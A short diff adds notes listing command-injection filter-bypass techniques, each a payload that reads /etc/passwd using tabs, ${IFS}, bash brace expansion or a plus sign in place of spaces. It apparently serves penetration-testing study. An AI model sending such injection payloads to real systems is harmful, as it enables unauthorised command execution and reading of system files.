@@ -1,0 +1,6 @@
+A few basic bypass techniques are:
+
+Using tabs: cat%09/etc/passwd
+Using the $IFS Linux Environment Variable: cat${IFS}/etc/passwd
+Using bash expansion: {cat,/etc/passwd}
+Using +: cat+/etc/passwd
